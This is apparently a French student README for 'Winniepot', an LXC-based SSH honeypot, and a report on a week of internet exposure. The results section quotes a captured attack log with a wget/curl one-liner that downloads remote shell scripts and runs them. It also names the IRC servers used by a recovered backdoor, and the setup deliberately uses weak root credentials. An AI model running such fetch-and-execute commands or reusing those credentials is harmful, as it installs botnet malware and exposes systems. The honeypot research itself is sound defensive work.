# WINNIEPOT DOCUMENTATION

Sommaire général:
* [1. Installation](#global_install)
    * [1.1 Prérequis](#prerequis)
    * [1.2 Installation des outils](#installation)
    * [1.3 Mise en service](#configuration)
    * [1.4 Mise en place du stockage externe](#option)
* [2. Fonctionnement interne](#fonctionnement)
    * [2.1 Fil rouge d'une attaque](#fil-rouge)
    * [2.2 Pendant l'attaque](#pendant-LATAK)
    * [2.3 Après l'attaque](#apres-LATAK)
* [3. Implémentation python](#PYTHON)
    * [3.1 Customisation](#customisation)
    * [3.2 Gestion des évènements](#event-gestion)
    * [3.3 Fonctions et données partagées](#shared-data)
    * [3.4 Examples](#exxx)
* [4. Résultats](#resultats)
    * [4.1 Présentation de notre implémenation.](#our-implem)
    * [4.2 Résultats obtenus.](#result)
* [5. Conclusion](#conclusion)
    * [5.1 Nos ressentis.](#feelings)
    * [5.2 Améliorations futures.](#forthefuture)


<br/>
<br/>

## 1. INSTALLATION<a id="global_install"></a>

### **1.1 Prérequis**<a id="prerequis"></a>
 - Une machine linux (testé uniquement sous: Ubuntu 21.04 LTS) avec une connection internet.
 - Python 3 (testé uniquement sous: python3.9.7).
 - LXC (testé uniquement sous: LXC 5.0.0)

### **1.2 Installation des outils**<a id="installation"></a>

#### Installation de lxd

```bash
$ sudo snap install lxd
$ sudo lxd init
```

#### Installation de la vm et des scripts python

```bash
$ sudo lxc launch ubuntu:21.10 honey
```
```bash
$ wget 51.68.230.75:8080/honeypack.tar; sudo tar -xvf honeypack.tar -C /var/lib/lxd/containers/honey/; rm honeypack.tar; wget 51.68.230.75:8080/admin.tar; tar -xf admin.tar -C honeyscript/; rm admin.tar;
```

#### Initialisation de la vm

<a id="infolxc"></a>
```bash
$ sudo lxc start honey
$ sudo lxc info honey
$ sudo lxc stop honey
```

Configuration des scripts avec l'IP du serveur. Remplacez ``<ip.de.votre.machine>`` par l'IP LXC de votre machine avant d'exécuter la commande:

```bash
$ ip=<ip.de.votre.machine>; sudo sed -i 's/IP/$ip/g' /var/lib/lxd/containers/honey/template/usr/bin/NetworkManager; sudo sed -i 's/IP_SERVER/$ip/g' /var/lib/lxd/containers/honey/template/usr/bin/serve;
```

Une fois les scripts initialisés, nous pouvons revert la snapshot et préparer le honeypot au lancement.

```bash
$ sudo lxc restore honey template
```

### **1.3 Mise en service**<a id="configuration"></a>

Vérification du bon fonctionnement du honeypot, pour le démarrer:
```bash
$ sudo python3 honeyscript/server/main.py
```

Dans un autre shell:
```bash
$ ssh root@$ip_vm -p 22
```
le mot de passe de l'utilisateur root est ``root`` et ``ubuntu`` pour ubuntu

Si tout fonctionne correctement vous pouvez fermer le serveur avec un ``CTRL-C`` dans le shell qui l'a lancé, le honeypot devrait s'éteindre et revert la snapshot.

Ci-dessous, la commande iptables pour rediriger le port 22 du serveur vers celui du conteneur LXC:

```bash
$ sudo iptables -A FORWARD -i lxdbr0 -o ens3 -p tcp --dport 22 -j ACCEPT; sudo iptables -t nat -I PREROUTING -p tcp -i ens3 --dport 22 -j DNAT --to $ip_honeypot:22
```

L'IP de du honeypot se récupère via la commande ``lxc info honey``, comme [au dessus.](#infolxc)

A partir de maintenant le honeypot est accessible de l'exterieur via le port 22 en ssh.

### **1.4 Mise en place du stockage externe**<a id="option"></a>

Pour aller de pair avec notre honeypot nous avons mis en place un stockage externe indépendant qui va récuperer toutes les ressources récuperées sur le honeypot.

Dans les fichiers fournis se trouve un script python ``recieve_file.py`` qui est à upload sur le serveur de stockage et d'en faire un service. Il utilise le port ``5566`` par defaut.

Pour le mettre en place il faudra suivre [cette documentation](#stockage-server)

## 2. FONCTIONNEMENT INTERNE <a id="fonctionnement"></a>

### **2.1 Fil rouge d'une attaque**<a id="fil-rouge"></a>
Lorsque un attaquant se connecte en SSH sur la machine vulnérable, un [script python](./sources/honeypot/motd-script-loader.py) situé dans ``/etc/update-motd.d/`` est lancé. En effet, lors d'une connexion en ssh, les scripts situés dans cet emplacement sont lancé avec pour effet d'afficher dans la console du connecté des informations, des "message of the day". Nous utilisons donc cette fonctionnalité pour lancer à l'insus du connecté un autre [script](./sources/winniepot/ping-handler.py) qui se charge d'envoyer au serveur un ping toutes les 10 secondes sur le port 13000. Une fois le premier ping reçu, le [serveur](./sources/server/winniepot.py) détecte que quelqu'un est connecté et lance un [compte à rebours de 10 minutes](#wild-time). Une fois ce temps écoulé, le serveur lance la procédure de redémarrage du honeypot, et va revert la snapshot originale. De plus, si après un ping le serveur n'en reçoit pas un autre dans les [30 secondes](#timeout), la procédure de redémarrage est aussi lancée.

### **2.2 Durant l'attaque**<a id="pendant-LATAK"></a>
Une fois l'attaquant connecté, toute commande tapée sur le terminal sera enregistrée et envoyée au serveur grâce au ``.bashrc`` des utilisateurs présents. Nous utilisons l'outil [préexex](https://github.com/rcaloras/bash-preexec) qui, associé à un [script python](./sources/honeypot/command-logger), nous permet d'envoyer la commande au serveur avant qu'elle soit éxecutée sur le honeypot. Avec la commande tapée par l'attaquant est envoyée son IP, grâce à la variable bash ``$SSH_CLIENT`` créée par openssh lors d'une connection.

### **2.3 Après l'attaque**<a id="apres-LATAK"></a>
Comme dit précedemment, une fois les [10 minutes](#wild-time) écoulées ou un [timeout](#timeout) des pings, le serveur lance la procédure de redémarrage. Cette procédure comporte plusieurs étapes, s'enchaînant pour une durée complète allant de 5 à 10 minutes (testé uniquement sur notre implémentation). Le containeur honeypot est donc arreté en premier, coupant toutes les connection SSH présentes. 
Une snapshot est prise de l'état actuel du containeur, ainsi tout les fichiers téléchargés sont sauvegardés. Si un serveur de stockage est [activé](#option), une archive sera créée comportant les fichiers de la snapshot, ainsi que le [fichier de log](#logfile) contenant toutes les commandes. L'archive sera supprimé ainsi que la snapshot pour ne pas remplir l'espace disque du serveur. La dernière chose est le revert de la snapshot originale, et le redémarrage du containeur.
 
## 3. PYTHON DOCUMENTATION <a id="PYTHON"></a>

### **3.1 Customisation**<a id="customisation"></a>
Certaines variables sont modifiables pour permettre une customisation du comportement du serveur.  


<a id="timeout"></a>
```
winniepot.TIMEOUT : int
```
> Détermine la durée (en secondes) à attendre sans ping avant de signaler que le honeypot ne répond plus.
scénario peuvent créer ce comportement, l'attaquant éteint le honeypot, coupe internet, la ram, arrête le service qui ping le serveur...  
La valeur par défault est 30 secondes.

<br/>
<a id="wild-time"></a>

```
winniepot.WILD_TIME : int
```
>Détermine combien de temps (en minutes) le honeypot reste allumé après une connexion. 
Lorsque ce temps est écoulé, le serveur lance la procédure de restart.  
La valeur par défault est 10 minutes.

<br/>
<a id="take-snapshot"></a>

```
winniepot.TAKE_SNAPSHOTS : bool  
```  
>Détermine si le serveur doit prendre une snapshot du honeypot à chaque redémarrage.  
La valeur par défault est True

<br/>
<a id="stockage-server"></a>

```
winniepot.STOCKAGE_SERVER : tuple(string, int)
```
> Le couple correspondant à l'ip et le port du serveur de stockage distant. Ce serveur sert à récupérer une archive du résumé de l'attaque, comprennant: une snapshot complète de la machine au moment ou elle a été arreté (si TAKE_SNAPSHOTS est à True) ainsi qu'un fichier txt qui contient la liste de toutes les commandes qui ont été effectuées.  
Si cette variable n'est pas modifié, le résumé sera stocké localement sur le serveur.

<br/>

<a id="logfile"></a>
```
winniepot.LOGFILE : string
```
> Le nom du fichier utilisé pour sauvegarder les commandes effectuées sur le honeypot.  
Si cette variable n'est pas modifié, aucune commande ne seront enregistré sur un fichier, seul le retour console les affichera.

<br/>


### **3.2 Gestion des évènements**<a id="event-gestion"></a>
L'utilisateur peut personnaliser le comportement du serveur grâce à un système d'évènements.
Ainsi, on peut créer un comportement personnalisé qui sera effectué lorsque l'évènement se produira.  
Exemple: affichage de "hello world" lors d'une nouvelle connexion:

```py
winniepot.custom_event("on_connection")
def new_connection_handler():
	print("hello world")
```

ci-dessous une description de tout les évènements personnalisables


```
on_connection
```
> Appelé lorsqu'un attaquant se connecte pour la première fois depuis le dernier redémarrage.   
Ne prend aucune argument

<br/>

<a id="on_connection_lost"></a>
```
on_connection_lost
```
> Appelé lorque le honeypot n'envoie plus de données au serveur et est considéré comme compromis. Après cet évènement, le honeypot sera redémarré et sera revert à son état initial.  
Ne prend aucun argument.

<br/>

```
on_ping
```
> Appelé lors de la réception d'un ping provenant du honeypot.  
Ne prend aucun argument.

<br/>


<a id="foreign-data"></a>

```
on_foreign_data
```

> Appelé lorsque le port reservé à la reception de données provenant du honeypot reçoit des données suspectes ne respectant pas le protocole de communication établit. Cet évènement n'est pas obligatoirement lié au honeypot, le port du serveur étant exposé sur internet/sur le réseau local.  
Prend un argument, de type `str` qui correspond au contenu du message reçu sur le port.

<br/>

```
on_command
```
> Appelé lorsque le serveur reçoit du honeypot la dernière commande que l'attaquant à exécuté.  
Prend un argument, de type `str` qui correspond à la commande.

<br/>

<a id="on-restart"></a>
```
on_restart
```
> Appelé au tout début de la procédure de réinitialisation du honeypot. La différence avec [`on_connection_lost`](#on_connection_lost) est que `on_restart` sera aussi appelé lorsque le honeypot atteint la limite de temps de compromission définit par la variable [`WILD_TIME`](#wild-time).  
Ne prend aucun argument.
 
<br/>

### **3.3 Fonctions et données partagées**<a id="shared-data"></a>
Certaines fonctions et variables sont accessibles et permettent une meilleure interactivité avec la gestion du honeypot.

```
winniepot.restart_procedure()
```
> Cette fonction lance la procédure de redémarrage et de réinitialisation du honeypot à son état d'origine.  
Si [`TAKE_SNAPSHOT`](#take-snapshot) est à True, une snapshot sera prise avant la réinitialisation  
Si [`STOCKAGE_SERVER`](#stockage-server) est définit, l'archive résumant l'attaque sera envoyé au serveur.  
Note: l'évènement customisable ["on_restart"](#on-restart) est appelé au tout début de cette fonction.  

<br/>

```
winniepot.send_file(filename)
```
> `filename` : (str) nom du ficher.  
 Cette fonction envoie au serveur de stockage le fichier passé en paramètre.
 Si le fichier n'existe pas ou que [`STOCKAGE_SERVER`](#stockage-server) n'est pas définit, l'erreur sera affiché dans la console et le reste de la fonction ne sera pas exécuté.

<br/>

```
winniepot.stop_honeypot()
```
> Arrête simplement le conteneur lxc du honeypot via une commande système (`lxc stop --force honey`).

<br/>

```
winniepot.start_honeypot()
```
> Démarre simplement le conteneur lxc du honeypot via une commande système (`lxc start honey`).

<br/>

```
winniepot.stop()
```
> Un enchainement de fonctions pour fermer le serveur, fermer l'instance du honeypot et restore la snapshot vierge.

<br/>

```
winniepot.log_console(message, logtype="INFO")
```

> Affiche le message sur la console en respectant le format définit: ``<date> [logtype] - message``.

<br/>

```
winniepot.log_to_file(message, logtype="INFO")
```

> Ajoute dans le fichier [`LOGFILE`](#logfile) le message en respectant le format définit: ``<date> [logtype] - message``.
Si [`LOGFILE`](#logfile) n'est pas définit, rien n'est fait. Si [`LOGFILE`](#logfile) n'existe pas mais est définit, le fichier sera crée.

<br/>

```
winniepot.run()
```

> Démarre le serveur et une instance du honeypot.

<br/>

```
winniepot.session : dict
```
> Ce dictionnaire contient 2 entrées; "connected" et "ip".  
"connected" est un booléen et est mit à True lorsqu'un intrus s'est connecté au honeypot et est reset à False lorsque le honeypot est redémarré.
"ip" est une chaîne de caractère contenant l'ip de l'attaquant ou "0" quand personne n'est connecté au honeypot.


<br/>

### **3.4 Exemples** <a id="exxx"></a>


### Utilisation normale, sans customisation

```py
import winniepot

winniepot.run()
```

### Example de customisation

```py
import winniepot

winniepot.STOCKAGE_SERVER = ("13.37.13.37", 5566)

@winniepot.custom_event("on_connection")
def connection_handle():
    winniepot.log_console("The honeypot is compromised !", "WARNING")

@winniepot.custom_event("on_ping")
def ping_handle():
    winniepot.log_console(f"{winniepot.session['ip']} - ping")

@winniepot.custom_event("on_command")
def command_handle(command):
    # We just want to see if someone is connecting, we don't care about the commands.
    # So the honeypot is restarted on the first command the attacker enter.
    winniepot.restart_procedure()

winniepot.run()
```
Grâce à cette possibilité de customisation, il est facile d'imaginer une intégration en profondeur à une infrastructure existante, avec des alertes en fonction des besoins. On peut par exemple imaginer une gestion d'alertes via un compte automatisé twitter, discord, slack ou autres plateformes.

<a id="resultats"></a>

## 4 - RESULTATS

### **4.1 Présentation de notre implémenation.** <a id="our-implem"></a>
Pour démontrer la modularité et la capacité d'adaptation de notre honeypot, nous avons crée notre propre [implémentation](./demo/main.py). Ainsi, un bot twitter a été ajouté à la gestion du honeypot, avec un tweet à chaque fin d'attaque proposant un résumé de l'attaque ainsi qu'une description se modifiant automatiquement pour signaler si le honeypot est sous attaque ou non.

![Profile](./images/twitterprofil.png)
![Tweet](./images/twitterattack.png)

### **4.2 Résultats obtenu** <a id="result"></a>
Durant une exposition sur internet d'environ une semaine sans interruption, plusieurs comportements on été detectés, le plus courant étant une simple connection ssh sans aucune commandes tapées, probablement des robots récoltant les IP de tout les serveurs aux crédentiels par défault sans faire de commandes dessus, durant la durée du test, une bonne 20aine de connections de ce genre on pu être observées. Un autre type d'attaque à aussi été présent couramment, étonnament ce n'était pas directement relié au honeypot, mais au serveur attendant les ping du honeypot. En effet, la requête suivante à été envoyée de nombreuses fois au serveur sur le port 13000:

```
<24-3_13h47> [WARNING] - foreign data:
POST / HTTP/1.0
Content-Length: 51
Content-Type: application/json

{"id":0,"jsonrpc":"2.0","method":"eth_blockNumber"}
```
Le serveur détecte automatiquement les données ne venant pas du honeypot et adopte le comportement [foreign data](#foreign-data), ici nous l'affichons simplement à la console. Ce n'est pas directement une attaque sur le honeypot, mais probablement une tentative de minage de crypto monnaie envoyée sur le port ouvert de notre serveur.

Enfin, nous avons pu assister à une réelle attaque qui marque aussi la fin de l'exposition directe sur internet, le 21 octobre 2022 de 16h15 à 16h19. Ci-dessous, les logs de l'attaque effectuée.
```
<04-21_16h15> [91.134.127.80] - cd /data/local/tmp/; busybox wget http://205.185.116.110/w.sh; sh w.sh; curl http://205.185.116.110/c.sh; sh c.sh
<04-21_16h15> [91.134.127.80] - ls
<04-21_16h15> [91.134.127.80] - file *
<04-21_16h16> [91.134.127.80] - htop
<04-21_16h16> [91.134.127.80] - !
<04-21_16h16> [91.134.127.80] - ./sh4
<04-21_16h16> [91.134.127.80] - exit
<04-21_16h18> [91.134.127.80] - nano botnet.sj
<04-21_16h19> [91.134.127.80] - nano botnet.sh
<04-21_16h19> [91.134.127.80] - chmod +x botnet.sh 
<04-21_16h19> [91.134.127.80] - ./botnet.sh
```
Grâce à la gestions des snapshots, nous avons aussi pu récupérer tout les fichiers télechargés sur la machine, soit: ``w.sh``, ``c.sh``, ``sh4`` et ``botnet.sh``. Pour des raisons évidentes ils ne sont pas disponibles sur le git, mais sont en notre possession.

Après avoir mené une analyse, ``w.sh`` et ``c.sh`` sont des scripts detéctant la plateforme du système et téléchargeant un autre fichier distant qui correspond à la plateforme cible. Ici, ``sh4`` est un ELF, un exécutable linux, mais grâce à l'analyse des scripts, nous avons aussi pu trouver des fichiers similaires pour des plateformes diférentes, soit ARM, Android, EXE... 

``sh4`` se trouve être un malware de type trojan qui semblerait être le trojan MIRAI-BOTNET, voici un lien vers [l'analyse VirusTotal du fichier](https://www.virustotal.com/gui/file/793bf9870d0a744231f410116a26693eb835e7439b51cc45c2f059b59e4ad036/detection)

Enfin, ``botnet.sh`` ne semble pas être un malware connu, et après l'avoir analysé, nous sommes en capacité d'affirmer que c'est une backdoor implémentée en [IRC](https://en.wikipedia.org/wiki/Internet_Relay_Chat), un compte IRC automatisé qui attend de recevoir un message privé, vérifie que le message privé contient une certaine clé et exécute la commande passé par message si la clé est correcte.

Nous avons aussi récupéré la liste des liens vers un serveur IRC sur lequel le bot/backdoor se connecte, la voici:

```
ix1.undernet.org # biret
ix2.undernet.org # biret
Ashburn.Va.Us.UnderNet.org # biret
Bucharest.RO.EU.Undernet.Org # biret
Budapest.HU.EU.UnderNet.org # biret
Chicago.IL.US.Undernet.org # biret
```

Grâce à nos investigations, nous avons pu nous connecter à ce serveurs IRC, et en effet, on remarque que des bots sont bien présents !

![](./images/IRCbot.png)

``/!\ Disclaimer:`` (Y'a des trucs chelou et probablement pas très légaux sur le serveur IRC, be aware.)


<a id="conclusion"></a>

## 5. CONCLUSION

### **5.1 Nos ressentis** <a id="feelings"></a>
Malgrès quelques difficultés, notre projet est opérationnel et contient plus de fonctionnalités qu'attendu. En effet, le projet portait simplement sur la création d'un honeypot; au final, nous avons fait un outil déployable et customisable qui peut s'adapter facilement dans une infrastructure d'entreprise par exemple.

Nous avons eu l'occasion d'apprendre énormément dans beaucoup de domaines; LXC et son environnement, le développement réseau avec python et sa gestion des sockets, nous avons aussi beacoup appris sur l'environnement linux et évidemment la gestion d'un gros projet en équipe.

Enfin, nous avons eu la chance d'analyser une réelle attaque, d'analyser les malwares et de mener notre propre enquête sur l'origine de l'attaque et ses objectifs.

### **5.2 Améliorations futures** <a id="forthefuture"></a>
Nous prévoyons de continuer à travailler sur le honeypot, notamment pour l'améliorer sur quelques points.

* Une installation simplifié, éventuellement un script d'installation automatique. C'est un point qui, bien qu'indirect au projet, nous tient à coeur, notre projet final visant à être déployable dans une infrastructure, il est important pour nous de fournir une installation simple et automatique.

* Instancier les honeypot pour pouvoir avoir en simultané plusieurs attaques. Actuellement, les connexions SSH sont limités à 1, donc potentiellement un attaquant pourrait être refusé car quelqu'un est déjà connecté.